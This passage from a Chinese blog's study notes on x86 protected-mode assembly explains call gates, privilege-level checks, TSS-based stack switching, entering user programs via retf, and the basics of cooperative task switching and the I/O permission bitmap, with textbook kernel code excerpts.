<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/6518feaecf9fc62d080fc0d091355ed0.png" class="">

<p>安装调用门之后的GDT布局：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/7ae4d92e523e91c9d13143d5d81db293.png" class="">



<h2 id="12-调用门测试和调用门转移过程"><a href="#12-调用门测试和调用门转移过程" class="headerlink" title="12. 调用门测试和调用门转移过程"></a>12. 调用门测试和调用门转移过程</h2><p>接上一节，本节对代码段进行测试：</p>
<pre><code class="assembly">    ;对门进行测试
    mov ebx,message_2
    call far [salt_1+256]				;通过门显示信息(偏移量将被忽略)
                                        ;此时DS指向内核数据段
    
    mov ebx,message_3
    call sys_routine_seg_sel:put_string ;在内核中调用例程不需要通过门
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/528c93b00b480f0755db858e7019c86b.png" class="">

<ol>
<li>DS是指向内核数据段，偏移<strong>salt_1+256</strong>指向一个地址，地址处存放的是一个偏移和一个选择子；</li>
<li>处理器使用段选择子到GDT中取出描述符，发现是一个调用门描述符，包含一个代码段选择子和段内偏移；</li>
<li>处理器将代码段选择子传送到CS的段选择器部分，将段内偏移传送到EIP；</li>
<li>处理器使用CS段选择器中的选择子访问GDT，将取出的描述符存放到CS描述符高速缓存器；</li>
<li>处理器使用CS描述符高速缓存器加上EIP中的偏移转移到目标例程开始执行</li>
</ol>
<p>在这里<strong>salt_1+256</strong>地址处指定的偏移量和选择子中，只是使用了选择子部分。即再通过调用门实施控制转移时，在指令中提供的偏移量会被忽略。但是在指令中偏移量还是要加上。如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/de2084be174908ddc891a44709eb349d.png" class="">
<p>若0x0030指定的选择子是一个调用门，那么指令中指定的偏移量0x0000C000不会被使用，但是在书写时不能不写，但是可以写一个任意值。</p>
<p>通过调用门实施控制转移时的特权级检查</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b9122dfea493ddd6e1e01d87931ce2ac.png" class="">
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a51b09bd9abd495fbb26d503615fbe12.png" class="">


<h2 id="13-通过调用门实施由低特权级到高特权级的转移"><a href="#13-通过调用门实施由低特权级到高特权级的转移" class="headerlink" title="13. 通过调用门实施由低特权级到高特权级的转移"></a>13. 通过调用门实施由低特权级到高特权级的转移</h2><p>接上一节，本节具体看代码<strong>c14_core2.asm</strong></p>
<p>其中用户程序调用内核例程和过程：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e30802c6c987a49c9a97e3b200122cc7.png" class="">
<p>特权级检查：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/36e7df3cf593f7328368b76a0c077619.png" class="">


<h2 id="14-通过调用门转移控制时的栈切换过程"><a href="#14-通过调用门转移控制时的栈切换过程" class="headerlink" title="14. 通过调用门转移控制时的栈切换过程"></a>14. 通过调用门转移控制时的栈切换过程</h2><p>用<strong>CALL</strong>指令通过调用门实施控制转移可以改变程序的当前特权级<strong>CPL</strong>。比如从用户程序的3特权级用call指令通过调用门进入内核程序后，当前的CPL也会变为0特权级。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/19dfe1105f0d2f3c98eb7c2c64c36496.png" class="">

<p>问题在于通过调用门转移的时候，栈的切换时处理器自动进行的，那么处理器是如何知道应该切换到哪一个栈，又是如何知道栈在哪里的呢。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9e54f5e4a7b6a8667a36e1ea17b856d7.png" class="">
<p>TSS中没有保存3特权级栈段选择子和栈指针时因为通过调用门转移时，是从低特权级转移到高特权级中，特权级3是最低的，不可能从更低的特权级转移到3特权级中了，所以TSS中也就不需要存储特权级3的栈段选择子和栈指针。</p>
<p>在用户程序中：</p>
<pre><code class="assembly">         mov eax,100                         ;逻辑扇区号100
         mov ebx,buffer                      ;缓冲区偏移地址
         call far [fs:ReadDiskData]          ;段间调用 
</code></pre>
<p><strong>call far</strong>指令执行时，当前CPL = 3，目标例程位于内核的公共例程段，内核的公共例程段的特权级DPL = 0，因此进入目标例程时需要对栈进行切换。</p>
<p>切换之前的栈时用户程序自己的栈，若转移之前需要通过栈传递参数则存在用户程序自己的栈中，此处并未使用栈传递参数，而是通过寄存器传递参数。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a0bc603ee99aac03173c64f016e9e70a.png" class="">

<ol>
<li>一旦处理器发现特权级更改就要对栈进行切换，而目标代码段的特权级是0；</li>
<li>然后立即到当前任务的TSS中，取出特权级0的栈段选择子<strong>SS0</strong>、和栈指针<strong>EIP0</strong>；</li>
<li>分别传送到栈段寄存器<strong>SS</strong>和栈指针寄存器<strong>ESP</strong>；</li>
<li><strong>SS</strong>的段选择器部分发生改变后，处理器立即根据段选择子到GDT/LDT中取出描述符</li>
<li>将取出的描述符传送到<strong>SS</strong>描述符高速缓存器中，这样新的栈段就可以使用了。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/74e528f9b31450fde9a622b1a75eece1.png" class="">
切换到新栈之后，处理器立即压入旧栈的<strong>SS和ESP</strong>，这样做是为了当从调用门返回时，可以返回到用户程序原来自己的栈中。其中段选择子是16位的，压入时使用<strong>movsz</strong>指令0扩展至32位。接着处理器将旧栈中的参数传递到新栈中（参数个数记录在调用门描述符高32位的0~4)。因为在这个调用中使用的是寄存器传参，所以这里参数部分是没有的。</li>
</ol>
<p>复制完参数之后，处理器再将控制转移前的CS和EIP压栈，这样做是为了能够返回到原来的程序，也就是调用者那里。</p>
<p>栈切换的过程是由处理器自动进行的，现在处理器就可以执行目标例程了。</p>
<p>当例程返回时：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b1176d3ad6fdd9933abe8488ad1f2858.png" class="">
<p>从被调用程序的栈中返回<strong>SS、ESP、CS、EIP</strong>，如此一来就可以返回到原来的调用者那里去执行原来的程序，并切换回原来的旧栈。</p>
<h2 id="15-通过调用门转移控制并返回的完整描述"><a href="#15-通过调用门转移控制并返回的完整描述" class="headerlink" title="15. 通过调用门转移控制并返回的完整描述"></a>15. 通过调用门转移控制并返回的完整描述</h2><p>通过调用门转移控制并返回的全过程：<br>使用<strong>call far</strong>指令通过调用门转移控制时，如果改变了当前的特权级别则必须切换栈，即从当前任务的固有栈切换到切换到与目标代码段相同特权级别的栈上。</p>
<p>栈的切换是由处理器固件自动进行的，当前栈是由<strong>SS和ESP</strong>的当前内容指示的，要切换到的新栈位于当前任务的<strong>TSS</strong>中，处理器知道如何找到它。在栈切换前处理器要检查新栈是否有足够的空间完成本次控制转移。</p>
<p>控制转移和栈切换的过程如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/f7134a3acce2a32acee54711ec2cb469.png" class="">
<p>如果调用门的控制转移是由<strong>jmp far</strong>指令发起的，则转移后不再返回，而且没有特权级的变化就不需要切换栈；<br>相反，如果调用门的控制转移是由<strong>call far</strong>指令发起的，那么可以使用远转移指令<strong>retf</strong>返回到调用者。</p>
<p>返回时，处理器从栈中弹出调用者的<strong>代码段选择子</strong>和<strong>指令指针</strong>，不管是从相同的特权级还是从不同的特权级返回，为了安全处理器都会进行特权级检查，控制返回的全过程如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/0df927207154745600b71a08826ebcc2.png" class="">
<p>特权级检查不是在实际访问时进行的，而是在将段选择子带入寄存器时进行的，因此当控制低特权级的段通过调用门进入高特权级的段之后，假如高特权级的段使用指令<strong>mov ds, …</strong> 将一个高特权级的数据段选择子带入DS时，如果能够通过特权级检查时没有问题的。</p>
<p>在返回第特权级的段后，低特权级的程序依然能够使用指令<mark>mov [xx], xx</mark>来访问高特权级的数据段，而不会进行任何检查，这是很危险的。为了解决这个问题，在执行<strong>retf</strong>时处理器要检查数据段寄存器，根据他们找到相应的段描述符，要是有任意一个段描述符的DPL高于调用者的特权级也就是返回后的新CPL，那么处理器将会把数值0传送到该段寄存器的段选择器中（0是一个特殊的段选择子，处理器允许传入而且不会引发任何异常），但是后续使用这样的段选择器访问内存时一定会引发处理器异常中断。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/44f4a1e4fc015ba16294623f907c5a4d.png" class="">
<p>TSS中的SS0、ESP0等是静态的，除非软件修改它们，处理是不会修改它们的。当处理器通过调用门进入特权级0的代码段时，处理器会使用SS0和ESP0切换到特权级0的栈段，在此之后栈指针可能会因为压栈出栈而改变，但是返回时并不会更新到TSS中的ESP0，下次通过调用门进入特权级0的代码段时，用的依然是静态的ESP0的值。</p>
<h2 id="16-创建0、1、2特权级的栈并登记在TSS中"><a href="#16-创建0、1、2特权级的栈并登记在TSS中" class="headerlink" title="16. 创建0、1、2特权级的栈并登记在TSS中"></a>16. 创建0、1、2特权级的栈并登记在TSS中</h2><p>上一节介绍了通过调用门转移控制和返回的全过程，据此知道必须要创建<strong>特权级为0、1、2</strong>的栈段，并登记在当前任务的任务状态段<strong>TSS</strong>中，对于每一个栈包括栈的线性基地址、栈段选择子、初始栈指针。先把这些信息保存到TCB最后再来填写TSS。</p>
<p>在<strong>load_relocate_program</strong>程序中，处理完SALT之后，从栈中取得TCB的线性基地址，之后就可以创建0、1、2特权级的栈段了：</p>
<pre><code class="assembly">    mov esi,[ebp+11*4]                  ;从堆栈中取得TCB的基地址
    
    ;创建0特权级栈
    mov ecx,0                           ;以4KB为单位的栈段界限值
    mov [es:esi+0x1a],ecx               ;登记0特权级栈界限到TCB
    inc ecx
    shl ecx,12                          ;乘以4096，得到段大小
    push ecx
    call sys_routine_seg_sel:allocate_memory
    mov [es:esi+0x1e],ecx               ;登记0特权级栈基地址到TCB
    mov eax,ecx
    mov ebx,[es:esi+0x1a]               ;段长度（界限）
    mov ecx,0x00c09200                  ;4KB粒度，读写，特权级0
    call sys_routine_seg_sel:make_seg_descriptor
    mov ebx,esi                         ;TCB的基地址
    call fill_descriptor_in_ldt
    ;or cx,0000_0000_0000_0000          ;设置选择子的特权级为0
    mov [es:esi+0x22],cx                ;登记0特权级堆栈选择子到TCB
    pop dword [es:esi+0x24]             ;登记0特权级堆栈初始ESP到TCB
                                        ;对于一个向上扩展的栈；来说，初始栈指针
                                        ;应该设置成栈的总大小
</code></pre>
<p>创建<strong>0、1、2特权级栈</strong>之后任务控制块<strong>TCB的结构如下</strong>：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9ab26e5173251877414c71dac2562ea7.png" class="">

<p>创建完<strong>3个特权级栈</strong>之后，先创建<strong>LDT</strong>描述符，并将其安装在<strong>GDT</strong>中，之后创建任务状态段<strong>TSS</strong>。</p>
<pre><code class="assembly">    ;在GDT中登记LDT描述符
    mov eax,[es:esi+0x0c]              ;LDT的起始线性地址
    movzx ebx,word [es:esi+0x0a]       ;LDT段界限
    mov ecx,0x00008200                 ;LDT描述符，特权级0
    call sys_routine_seg_sel:make_seg_descriptor
    call sys_routine_seg_sel:set_up_gdt_descriptor
    mov [es:esi+0x10],cx               ;登记LDT选择子到TCB中
    
    ;创建用户程序的TSS
    mov ecx,104                        ;tss的基本尺寸
    mov [es:esi+0x12],cx              
    dec word [es:esi+0x12]             ;登记TSS界限值到TCB 
    call sys_routine_seg_sel:allocate_memory
    mov [es:esi+0x14],ecx              ;登记TSS基地址到TCB
</code></pre>
<p>之后从TCB中取出<strong>0、1、2</strong>三个特权级的栈段选择子和栈指针，并填写到<strong>TSS</strong>中：</p>
<pre><code class="assembly">    ;登记基本的TSS表格内容
    mov edx,[es:esi+0x24]              ;登记0特权级栈初始ESP
    mov [es:ecx+4],edx                 ;到TSS中
    
    mov dx,[es:esi+0x22]               ;登记0特权级栈段选择子
    mov [es:ecx+8],dx                  ;到TSS中
    
    mov edx,[es:esi+0x32]              ;登记1特权级栈初始ESP
    mov [es:ecx+12],edx                ;到TSS中
    
    mov dx,[es:esi+0x30]               ;登记1特权级栈段选择子
    mov [es:ecx+16],dx                 ;到TSS中
    
    mov edx,[es:esi+0x40]              ;登记2特权级栈初始ESP
    mov [es:ecx+20],edx                ;到TSS中
    
    mov dx,[es:esi+0x3e]               ;登记2特权级栈段选择子
    mov [es:ecx+24],dx                 ;到TSS中
    
    mov dx,[es:esi+0x10]               ;登记任务的LDT选择子
    mov [es:ecx+96],dx                 ;到TSS中
    
    mov word [es:ecx+100],0            ;T=0
</code></pre>
<p>之后就是创建<strong>TSS</strong>描述符，并在GDT中登记TSS描述符：</p>
<pre><code class="assembly">    ;在GDT中登记TSS描述符
    mov eax,[es:esi+0x14]              ;TSS的起始线性地址
    movzx ebx,word [es:esi+0x12]       ;段长度（界限）
    mov ecx,0x00008900                 ;TSS描述符，特权级0
    call sys_routine_seg_sel:make_seg_descriptor
    call sys_routine_seg_sel:set_up_gdt_descriptor
    mov [es:esi+0x18],cx               ;登记TSS选择子到TCB
</code></pre>
<p>之后就是<mark>ret 8</mark>指令返回到调用者。</p>
<h2 id="17-通过模拟调用门返回进入用户程序执行"><a href="#17-通过模拟调用门返回进入用户程序执行" class="headerlink" title="17. 通过模拟调用门返回进入用户程序执行"></a>17. 通过模拟调用门返回进入用户程序执行</h2><p>接上一节，返回到内核<strong>start</strong>调用者之后，加载任务寄存器<strong>TR</strong>以及局部描述符表寄存器<strong>LDTR</strong>：</p>
<pre><code class="assembly">    ltr [ecx+0x18]		;加载任务状态段
    lldt [ecx+0x10]		;加载LDT
</code></pre>
<p>这两条指令执行之后表明当前正在一个任务中执行，现在是在任务的全局部分执行，并且应该转移到任务的私有部分（用户程序）执行。</p>
<p>在用户程序中每个段的描述符特权级<strong>DPL = 3</strong>，以前使用<strong>jmp</strong>指令完成转移，但是当前程序特权级CPL = 0，从高特权级使用<strong>jmp</strong>或<strong>call</strong>指令转移到低特权级时不被允许的。</p>
<p>通过模拟从调用门返回进入低特权级的用户程序中执行，在栈中压入以下部分：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a23d6b3e8979060aa4a9cb178e98a27f.png" class="">

<p>代码如下：</p>
<pre><code class="assembly">    mov ds,[ecx+0x44]		;切换到用户程序头部段
                            ;使用DS取得数据，之后再回头修改DS
    
    ;以下假装是从调用门返回。摹仿处理器压入返回参数
    push dword [0x1c]		;调用前的堆栈段选择子
    push dword 0			;调用前的esp
    
    push dword [0x0c]		;调用前的代码段选择子
    push dword [0x08]		;调用前的eip
    
    retf
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/494eeae03df39fb176ef1babebb7c9b7.png" class="">
<p>之后进入用户程序执行，执行完成之后返回：</p>
<pre><code class="assembly">        jmp far [fs:TerminatePorgram]			;将控制权返回到系统
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/36523565de8778222c076fd55ab5ccaa.png" class="">
<p>但是<strong>jmp</strong>执行时，<strong>CPL = 3，DPL = 0</strong>，条件不成立，不能使<strong>jmp</strong>指令返回，这里改成<strong>call far</strong>即可，不过<strong>call</strong>指令会在栈中压入返回地址。不过在用户程序终止后，其占用的资源都会被回收，包括栈段，这种情况下压入数据和不压入数据是一样的。</p>
<p>Virtual Box运行：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/019882c53d7533d421d43dc588d91283.png" class="">
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/f0955c31ac0d10e20deec392c7112361.png" class="">
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/0b667250859c67753ffa8d22eea56c58.png" class="">

]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86特权级和特权级保护</tag>
      </tags>
  </entry>
  <entry>
    <title>协同式任务切换</title>
    <url>/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="01-任务和任务切换概述"><a href="#01-任务和任务切换概述" class="headerlink" title="01. 任务和任务切换概述"></a>01. 任务和任务切换概述</h2><p>多任务系统中，每个任务都有自己的任务状态段<strong>TSS</strong>和局部描述符表<strong>LDT</strong>，当前任务是由任务寄存器<strong>TR</strong>指示，指向当前任务的任务状态段<strong>TSS</strong>、局部描述符表寄存器<strong>LDTR</strong>也指向当前局部描述符表<strong>LDT</strong>。</p>
<span id="more"></span>

<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ecaeb5708d898aabbeb7135046099657-166832967486710.png" class="">
<p>多任务系统是指可以同时执行两个或者两个以上任务的系统，即使一个任务没有执行完也可以执行下一个任务，多任务切换时<strong>TR</strong>和<strong>LDTR</strong>也要切换到新的任务中。</p>
<p>多任务切换方式：</p>
<ol>
<li><mark>协同式任务切换</mark>：需要当前任务主动请求暂时放弃执行权、或者在通过调用门请求操作系统服务时由操作系统乘机切换到另一个任务中。因此这种方式很依赖于当前执行任务的自律性，当一个任务失控时可能其它任务都得不到执行的机会。</li>
<li><mark>抢占式任务切换</mark>：这种方式可以安装一个定时器中断，在中断信号产生的时候进行任务切换。硬件中断会定时发生，不管处理器在做什么，当产生中断时任务一定会执行切任务换操作，这样所有任务都有平等的执行机会，当一个任务失控时也不会导致其他任务没有机会执行。</li>
</ol>
<p>多任务系统：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/dcc158c41bd25560420ed9ac91e93f1f-16683296748674.png" class="">
<p>任务的组成是灵活的，不一定由不同的特权级组成，也不一定由内核和用户程序组成<br>例如本章将创建三个任务：</p>
<ol>
<li>任务1由单独的内核组成，0特权级。内核除了是一个单独的任务，也是其他任务的全局部分。</li>
<li>任务2由任务2的私有部分和内核组成，其是3特权级。</li>
<li>任务3由任务3的私有部分和内核组成，其也是3特权级。<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/5c5fc3fa7fc5bf7b45bc94e33216aae7-16683296748671.png" class=""></li>
</ol>
<p>在本章中，当处理器加电复位之后，进入保护模式之后就直接创建和执行内核的0特权级任务→之后切换到任务2的私有部分→之后切换到内核→之后切换到任务3的私有部分。</p>
<p>每个任务都有自己的状态，特别是当一个任务再执行时，所有段寄存器和通用寄存器都和当前任务息息相关。段寄存器指向当前任务自己的段，通用寄存器保存着当前任务执行的数据和临时结果、标志寄存器保存着当前任务执行产生的各个标志位。</p>
<p>当前任务要切换出去，必须将当前任务的所有状态都保存起来以便将来恢复，这叫做保护现场。被切换到的那个任务也必须恢复到原先它被打断时的状态，叫做恢复现场。</p>
<p>为了保护现场和恢复现场，使用每个任务的<strong>TSS</strong>来保存数据：<strong>CR3</strong>和分页有关。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9338fcfaa209df58ccd8cec9796059a9-16683296748672.png" class="">
<p>保存当前任务的现场：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/00af7da67920361a23086cf9741893e9-16683296748673.png" class="">
<p>恢复目标任务的现场：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/da3677ea1fab46deb7cd37f467754371-16683296748675.png" class="">
<p>恢复之后被切换到的任务变成当前任务。</p>
<h2 id="02-内核任务的创建和当前I-x2F-O特权级LOPL"><a href="#02-内核任务的创建和当前I-x2F-O特权级LOPL" class="headerlink" title="02. 内核任务的创建和当前I/O特权级LOPL"></a>02. 内核任务的创建和当前I/O特权级LOPL</h2><p>本章程序：<br>引导程序：<strong>c13_mbr0.asm</strong>，加载执行内核。<br>内核程序：<strong>c15_core0.asm</strong>，加了新的内容。<br>用户程序：<strong>c15_app0.asm</strong>，加了新的内容。</p>
<p><strong>I/O许可位图</strong>，之前讲过特权指令，即只有<strong>0特权级</strong>才能执行的指令。但是有一些低特权级的程序也需要使用这些指令。<br>如下：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d0448a72f4c8a35a954f62f55b5e880c-16683296748676.png" class="">
<p>为了控制哪些任务能够访问硬件端口，需要用到标志寄存器EFLAGS：</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/c00656182066503226da7f091421e2e7-16683296748679.png" class="">
<p>当前特权级<strong>CPL</strong>若高于<strong>IOPL（I/O Privilege Level)<strong>，数值上</strong>CPL ≤ IOPL</strong>，则表示所有<strong>I/O</strong>访问都是被允许的。</p>
<h2 id="03-I-x2F-O特权级的修改和POPF指令"><a href="#03-I-x2F-O特权级的修改和POPF指令" class="headerlink" title="03. I/O特权级的修改和POPF指令"></a>03. I/O特权级的修改和POPF指令</h2><p>标志寄存器中的标志是会随着任务的执行而改变的，比如：<strong>ZF、CF</strong>；有些则需要特定的指令来改变，比如<strong>DF</strong>。但是<strong>IOPL</strong>不会自动随程序修改，也没有特定的指令来修改，修改<strong>IOPL</strong>需要执行以下操作：</p>
<ol>
<li><p>先将标志寄存器压栈</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/2e1ea44696421df22f3de6cd05dc5fb3-16683296748677.png" class="">
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/f6e06e2f34d89404d6261e892f7ce7a8-16683296748678.png" class="">
</li>
<li><p>然后对栈中<strong>IOPL</strong>内容进行修改</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/b877b21342d7e33e4f1c856eb51594ae-166832967486711.png" class="">
<p>将<strong>IOPL</strong>修改为01。</p>
</li>
<li><p>最后将栈中修改后的内容弹出到寄存器。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/91176a8596b09cbe9383b772a9bf48a4-166832967486712.png" class="">
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/d251cfc7ef40c8161ed1675c33700695-166832967486714.png" class=""></li>
</ol>
<h2 id="04-任务的用户态和内核态"><a href="#04-任务的用户态和内核态" class="headerlink" title="04. 任务的用户态和内核态"></a>04. 任务的用户态和内核态</h2><p>每个任务都有<strong>TSS</strong>，其中保存了<strong>EFLAGS</strong>，有<strong>IOPL</strong>字段。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/acf15bb6736f7490e9dcfd1a55b9f4d8-166832967486713.png" class="">
<p>多任务系统特点：可以在内核任务和用户任务之间来回切换、也可以再两个任务之间来回切换。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/718352e49749237d68e1c4ba568a88a1-166832967486715.png" class="">
<p>每当一个任务被切换回后台时，它与之相关的状态都会保存再它的<strong>TSS</strong>中，当它恢复时，会从它的<strong>TSS</strong>中将各种状态恢复到处理器中。显然每个任务都受自己的<strong>IOPL</strong>所限制。</p>
<p>每个任务都可以对自己的标志和状态进行修改，比如标志寄存器中的内容，需要使用如下指令进行压栈、修改、再出栈返回到标志寄存器中。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/41bea40aa66420d64e1fdbac1aa21dc5-166832967486716.png" class="">
<p>其中<mark>pushf、pushfd</mark>在任务特权级下均可执行，但是<mark>popf、popfd</mark>执行时标志寄存器中的有些标志位是否会受到影响（如IOPL字段)是否能被修改则取决于当前特权级<strong>CPL</strong>：</p>
<ol>
<li>CPL为0，那么执行<mark>popf、popfd</mark>指令时，标志寄存器的<mark>IOPL</mark>字段会被修改；</li>
<li>CPL为1，那么执行<mark>popf、popfd</mark>指令时，标志寄存器的<mark>IOPL</mark>字段类似于<strong>只读</strong>，不会受到影响；</li>
</ol>
<p>即低特权级指令无法使用<mark>popf、popfd</mark>指令修改<mark>IOPL</mark>字段。<mark>popf、popfd</mark>并不是特权指令，特权指令是只能在0特权级下执行，<mark>popf、popfd</mark>指令在低特权级下也可以执行，只不过在低特权级下执行时一些标志位不受其影响。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/bbef20148f7a47065143878328f53ea9-166832967486717.png" class="">
<p>内核任务只能在内核态执行，用户任务可以在内核态和用户态中执行。</p>
<h2 id="05-I-x2F-O许可位串和TSS的I-x2F-O许可位映射区"><a href="#05-I-x2F-O许可位串和TSS的I-x2F-O许可位映射区" class="headerlink" title="05. I/O许可位串和TSS的I/O许可位映射区"></a>05. I/O许可位串和TSS的I/O许可位映射区</h2><img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/9e36bd13dc99727a853f3386f567ae47-166832967486718.png" class="">
<p>当前<strong>CPL</strong>高于等于<strong>IOPL</strong>（数值上CPL ≤ IOPL），则所有<strong>I/O</strong>操作都是被允许的；<br>当前<strong>CPL</strong>低于<strong>IOPL</strong>（数值上CPL ≥ IOPL），也并非意味着所有<strong>I/O</strong>操作都是不被允许的，而是需要进一步指定哪些允许，哪些不允许。在输入输出（I/O许可位串）中指定。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/49ba689fa14560fdabc76ff3a3d24938-166832967486819.png" class="">
<p>TSS中基本长度是104字节，当然也可以包括I/O许可位映射区</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/ac052aceeb0186b956372984e4100f67-166832967486820.png" class="">
<p><strong>TSS</strong>描述符及其布局：其中段界限是包括<strong>I/O许可位映射区</strong>的。</p>
<img src="/2022/12/11/29-%E5%8D%8F%E5%90%8C%E5%BC%8F%E4%BB%BB%E5%8A%A1%E5%88%87%E6%8D%A2/dc6036897ff49aeebec6d08d4e222444-166832967486821.png" class="">
